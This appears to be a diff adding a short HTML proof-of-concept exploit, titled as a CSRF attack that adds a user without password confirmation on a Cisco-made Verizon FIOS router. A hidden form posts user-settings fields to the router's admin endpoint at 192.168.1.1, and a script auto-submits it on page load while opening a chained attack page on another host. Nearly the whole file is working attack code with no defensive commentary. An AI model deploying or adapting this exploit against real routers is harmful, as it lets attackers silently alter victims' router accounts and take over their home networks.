@@ -1,0 +1,19 @@
+<html>
+<title>Cisco Verizon FIOS CSRF2 - Add User w/ No Pass Confirmation</title>
+
+<body>
+<form name="verizonCiscoC" action="http://192.168.1.1/index.cgi" method="post">
+<input type="hidden" name="active_page" value="101"/>
+<input type="hidden" name="page_title" value="User Settings"/>
+<input type="hidden" name="mimic_button_field" value="submit_button_confirm_submit: .."/>
+<input type="hidden" name="button_value" value="."/>
+<input type="hidden" name="strip_page_top" value="0"/>
+</form>
+   
+<script>
+function CSRF1() {window.open("http://10.0.1.101/verizonFIOS3.html");};window.setTimeout(CSRF1,0500)
+function CSRF2() {document.verizonCiscoC.submit();};window.setTimeout(CSRF2,0500)
+</script>
+</body>
+
+</html>
